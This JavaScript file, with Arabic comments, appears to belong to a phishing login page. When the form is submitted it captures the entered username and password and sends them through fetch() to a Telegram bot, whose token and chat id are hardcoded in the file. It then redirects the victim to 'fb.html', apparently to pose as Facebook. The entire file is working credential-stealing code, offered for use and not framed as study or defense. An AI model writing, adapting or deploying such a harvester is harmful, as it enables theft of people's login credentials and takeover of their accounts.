document.addEventListener('DOMContentLoaded', function() {
    document.querySelector('form').addEventListener('submit', function(event) {
        event.preventDefault(); // منع إعادة تحميل الصفحة

        // الحصول على قيم الحقول
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        // إعداد البيانات لإرسالها
        var message = `Username: ${username}\nPassword: ${password}`;

        // استبدل 'your_bot_token' و 'your_chat_id' بالقيم الفعلية
        var botToken = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
        var chatId = '5687419212';
        var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // إعداد الطلب
        var params = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        };

        // إرسال الطلب
        fetch(apiUrl, params)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // توجيه المستخدم إلى صفحة fb.html عند النجاح
                    window.location.href = 'fb.html';
                } else {
                    alert('Error sending message.');
                }
            })
            .catch(error => {
                console.error('Error sending message:', error);
                alert('Error sending message.');
            });
    });

    window.addEventListener('load', function() {
        setTimeout(function() {
            document.getElementById('splash-screen').style.display = 'none';
            document.getElementById('login-page').style.display = 'block';
        }, 2000); // 2000 ميلي ثانية = 2 ثانية
    });
});
